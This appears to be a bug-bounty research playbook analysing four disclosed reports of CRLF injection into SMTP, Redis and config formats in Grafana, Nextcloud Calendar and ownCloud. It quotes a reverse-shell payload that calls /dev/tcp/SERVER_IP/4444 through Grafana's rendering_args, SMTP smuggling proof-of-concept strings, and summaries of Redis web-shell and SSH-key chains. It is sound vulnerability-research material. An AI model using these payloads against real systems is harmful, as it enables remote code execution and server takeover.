---
title: "Email / Plaintext-Protocol Injection — SMTP command smuggling via unsanitized mailbox fields, LDAP password to SMTP/Redis, Grafana rendering_args to RCE"
type: playbook
category: email-protocol-injection
cwe: "CWE-74"
source_count: 4
full_bodies_available: 4
corpus: "h1-brain disclosed_reports.db (sha256 8bf566e78446c73d9bbc57ef47ad88d645ef1ff4354727cca43b00769c41ccd4), bucket smuggling-crlf"
list_accessed: "2026-11-07"
note: "Anchors: SMUG-1200647 (Grafana RCE via SMTP password CRLF, $5,000 — vault max), SMUG-1509216 / SMUG-1516377 (Nextcloud SMTP appointment/iCalendar), SMUG-1054282 (ownCloud LDAP password to SMTP/Redis). All 4 bodies read end-to-end 2026-11-07."
---

# Email / Plaintext-Protocol Injection — CRLF, but the protocol is SMTP/Redis

## 1. Overview

Four rows, **$5,000/1 paid — and that one row is the vault maximum**. The shared
shape: a value that must not contain CR/LF reaches a library (SwiftMailer, an LDAP
bind, a managed-service config writer) that concatenates it into a
line-oriented plaintext protocol (SMTP, Redis RESP, memcached, postgres wire
protocol). The first CRLF ends the current command; everything after it is the
attacker's next command verbatim. This module holds the vault's single highest
bounty, the two most fully-diagrammed non-blind SMTP diaries in the corpus, and
the one protocol-smuggling row that chains through Redis to a web shell, slave
replication and an SSH key.

**Case-stock (4 rows / $5,000):**

| Case | Target | Mechanism | Bounty |
|---|---|---|---|
| [SMUG-1200647](https://hackerone.com/reports/1200647) | Aiven for Grafana | SMTP `password` accepts `\r\n` → sets non-exported `rendering_args` → image-renderer `--renderer-cmd-prefix=bash` → RCE | $5,000 |
| [SMUG-1054282](https://hackerone.com/reports/1054282) | ownCloud `user_ldap` | LDAP password field (`%0D%0A`) → SMTP + Redis RESP injection → web shell / slave-replication RCE / SSH key | - |
| [SMUG-1509216](https://hackerone.com/reports/1509216) | nextcloud/calendar | Booking `email` newline → breaks `RCPT TO:` → arbitrary SMTP (`EHLO`, `QUEU`, `MAIL FROM` swap), non-blind | - |
| [SMUG-1516377](https://hackerone.com/reports/1516377) | nextcloud/calendar | Poisoned iCalendar `ORGANIZER` newline → same SMTP injection, victim-triggered (CVE-2022-31014) | - |

## 2. The crown row: Grafana SMTP password CRLF → RCE — SMUG-1200647 ($5,000)

This is the highest-priced CRLF artifact in the corpus, and the body is titled
for exactly what it proves: "Grafana RCE via SMTP server parameter injection"
(weakness tag: CRLF Injection — the *tag* is the mechanism, the title the
impact). The Aiven console's `smtp_server.password` config accepted newlines
inside a JSON string:

> SMTP server password configuration setting accepts new line characters.

> This can be used to set non-exported configuration variables. Using this CRLF-injection, the `rendering_args` of grafana image renderer can be modified which leads to code execution on the Grafana server.

The payload nests a *second config section* inside the password value:

```
"password": "x\r\n[plugin.grafana-image-renderer]\r\nrendering_args=--renderer-cmd-prefix=bash -c bash$IFS-l$IFS>$IFS/dev/tcp/SERVER_IP/4444$IFS0<&1$IFS2>&1"
```

i.e. the SMTP password CRLF re-opens config-file parsing from inside a service
form field, and the image renderer — a different plugin, a different subsystem —
honors `--renderer-cmd-prefix` as shell. Trigger is a render request (`/render/x`);
confirmation is a reverse TCP shell from the grafana container. Impact as
reported:

> Command execution on the grafana server. Access and modify data on the grafana server and possibly the attacker could pivot into other servers on the aiven network.

The doctrine worth extracting: *CRLF in a config-writer field is config injection*,
and config injection into a shell-arg writer is RCE. The RCE vault's
"what the flaw reaches" pricing applies verbatim — $5,000 is the ceiling because
the reach is a reverse shell, not a spoofed email.

## 3. Booking-email SMTP smuggling — SMUG-1509216 (nextcloud/calendar)

The same primitive against SwiftMailer's SMTP transcript. The booking request's
`email` is reflected into `RCPT TO:<BOOKING USER'S EMAIL>` with newlines intact:

> Unfortunately, as newlines and special characters are not sanitized in the `email` value in the JSON request, a malicious attacker can inject newlines to break out of the `RCPT TO:<BOOKING USER'S EMAIL>` SMTP command and begin injecting arbitrary SMTP commands. Using several properties of the email RFC, an attacker can craft a payload that passes both the PHP validation of the email and the SwiftMail injection. These commands vary depending on the backend email server (Gmail, Outlook, local SMTP server) and thus can have different impacts, such as changing the `MAIL FROM` user, running sensitive commands like `QUEU` to view the current view, and so on. The errors in SMTP are returned in the response, thus making this a non-blind injection.

The POC is one JSON body: `"email":">\r\nEHLO a\r\nRCPT TO:<[REDACTED_EMAIL]>\"@b.com"`,
and Gmail's error string (with the EHLO banner) comes back in the HTTP response —
`{"status":"error","message":"Could not send mail: Expected response code 354 but got code "250"...` — a full oracular transcript because SMTP errors
propagate. That non-blindness is the detail to reuse: tell the SMTP library to
hand you the server's replies, and every paragraph of the protocol becomes
readable.

## 4. iCalendar smuggling — SMUG-1516377 (victim-triggered twin)

The second nextcloud/calendar row repeats the flaw through the mail app's
iCalendar import, with the attacker now needing no booking interaction at all —
the victim's acceptance replies through a pipeline the attacker poisoned:

> Unfortunately, since `<ORGANIZER EMAIL>` is not sanitized, if an attacker sends a poisoned iCalendar file with newlines in the `ORGANIZER` property, this will inject newlines in the pipelined SMTP commands, allowing the attacker to inject arbitrary SMTP commands.

> These commands vary depending on the backend email server (Gmail, Outlook, local SMTP server) and thus can have different impacts, such as changing the `MAIL FROM` user, running sensitive commands like `QUEU` to view the current view, and so on. The errors in SMTP are returned in the response, thus making this a non-blind injection.

Same `EHLO a` POC (`ORGANIZER;CN=Normal User:mailto:test(\nEHLO a\n)@gmail.com`),
same `Expected response code 354 but got code "250"` oracle — the stored variant,
where the `.ics` is the delivery vehicle and the recipient's client does the
sending.

## 5. LDAP password → SMTP/Redis protocol smuggling — SMUG-1054282 (ownCloud)

The widest-evidenced row in the module (admin-only, but three full RESP payload
chains shown): the `user_ldap` password field is concatenated into LDAP binds and
outbound service connections without a newline check, so `%0D%0A` turns the
admin's own password into a protocol stream:

> LDAP password field can be exploited with newline chars (\r\n) in order to communicate with protocols like SMTP, Redis and, generally speaking, with all services those speak plain text protocols (e.g. postgres, memcached, etc.).

The body's own impact statement reaches RCE in the same clause:

> An attacker, able to steal admin credentials/session cookies could leverage the password field to send arbitrary e-mails and even achieve remote code execution.

> Is sufficient to give arbitratry SMTP commands separated by EOL CHARS "%0D%0A".

(sic: "arbitratry")

Three Redis payloads are then shipped: (1) RESP `flushall`+`set`+`config set
dbfilename`/dir+s`ave` writing a PHP `system($_GET['cmd'])` web shell into the
ownCloud webroot; (2) `SLAVEOF`+`MODULE LOAD`/`system.exec` replication RCE;
(3) an SSH `authorized_keys` write via the same Redis key/data commands. The
prerequisite is honestly labeled at the top — "Privileges required: Admin" — and
the SMTP lane notes protocol-adequacy correctly: `arbitrary SMTP commands`
need no RESP framing at all.

## 6. What pays, what doesn't

- **Config-layer CRLF is the vault ceiling: $5,000 for the only row whose CRLF
  changes program behavior, not just mail**: SMUG-1200647 turned an SMTP password
  into a shell-arg prefix. Every other SMTP row in this module has no corpus
  bounty — spoofing `MAIL FROM`, queuing `QUEU`, spewing `EHLO` banners are
  Low/Info at triage.
- **Non-blindness did not price**: both nextcloud/calendar rows are full
  client-side transcripts with a readable oracle, and neither carries a DB
  figure — the corpus prices the *Grafana reach*, not the *SMTP technique*.
- **Admin-context protocol smuggling (SMUG-1054282) reached the most payloads
  and earned no corpus bounty** — the strongest reminder of the class: an
  admin-only field, however completely you own everything downstream of it, is
  priced by the prerequisite, not the payload.
- What the module's money *would* buy: a non-admin, stored or config-layer CRLF
  into anything that executes code, honors a `--*-cmd-prefix`/`rendering_args`-
  style directive, or shells out — i.e. module 01's undici/missing-validation moral
  repackaged as RCE.

## 7. Cross-references

- SMUG-1200647 is the smuggling-vault/RCE-vault bridge: the same severity ladder
  as module 01's blind-proof rows is in `RCE/01_OS-Command-Injection.md`, and
  the `--renderer-cmd-prefix` shape is an argument injection after the CRLF does
  its work.
- SMUG-590020's urllib→Redis socket trick (module 02) and SMUG-1054282's
  LDAP→Redis chain are the same "newline into a TCP text protocol" ladder; only
  the doorway differs (stdlib client vs ownCloud admin field).
- SMTP-response-splitting-style oracles (the `354`-vs-`250` transcript) belong in
  the SSRF/IDOR reading of leaked backend banners.
- The HTTP answer to this module: module 01's `space1`/`tabprefix1` mutations are
  the same missing-validation bug aimed at HTTP parsers instead of SMTP verbs.
